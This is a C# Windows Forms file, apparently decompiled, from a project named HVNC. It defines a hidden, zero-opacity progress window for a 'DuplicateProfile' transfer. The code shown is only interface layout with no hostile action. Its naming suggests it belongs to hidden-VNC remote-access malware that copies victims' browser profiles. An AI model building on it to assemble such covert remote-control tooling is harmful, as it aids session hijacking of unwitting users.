using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
	public class FrmTransfer : Form
	{
		private IContainer components;

		public int int_0;

		public ProgressBar DuplicateProgesse { get; set; }

		public Label FileTransferLabele { get; set; }

		public Label PingTransfor { get; set; }

		public FrmTransfer()
		{
			int_0 = 0;
			InitializeComponent();
		}

		private void FrmTransfer_Load(object sender, EventArgs e)
		{
		}

		public void DuplicateProfile(int int_1)
		{
			if (int_1 > int_0)
			{
				int_1 = int_0;
			}
			FileTransferLabele.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(int_0) + " MB";
			DuplicateProgesse.Value = int_1;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmTransfer));
			DuplicateProgesse = new System.Windows.Forms.ProgressBar();
			FileTransferLabele = new System.Windows.Forms.Label();
			PingTransfor = new System.Windows.Forms.Label();
			SuspendLayout();
			DuplicateProgesse.Location = new System.Drawing.Point(12, 12);
			DuplicateProgesse.Name = "DuplicateProgesse";
			DuplicateProgesse.Size = new System.Drawing.Size(453, 23);
			DuplicateProgesse.TabIndex = 1;
			FileTransferLabele.AutoSize = true;
			FileTransferLabele.Location = new System.Drawing.Point(225, 44);
			FileTransferLabele.Name = "FileTransferLabele";
			FileTransferLabele.Size = new System.Drawing.Size(37, 13);
			FileTransferLabele.TabIndex = 4;
			FileTransferLabele.Text = "Status";
			PingTransfor.AutoSize = true;
			PingTransfor.Location = new System.Drawing.Point(255, 44);
			PingTransfor.Name = "PingTransfor";
			PingTransfor.Size = new System.Drawing.Size(95, 13);
			PingTransfor.TabIndex = 5;
			PingTransfor.Text = "Ping: Measuring....";
			PingTransfor.Visible = false;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(475, 66);
			base.Controls.Add(FileTransferLabele);
			base.Controls.Add(DuplicateProgesse);
			base.Controls.Add(PingTransfor);
			DoubleBuffered = true;
			ForeColor = System.Drawing.Color.White;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmTransfer";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			base.Load += new System.EventHandler(FrmTransfer_Load);
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
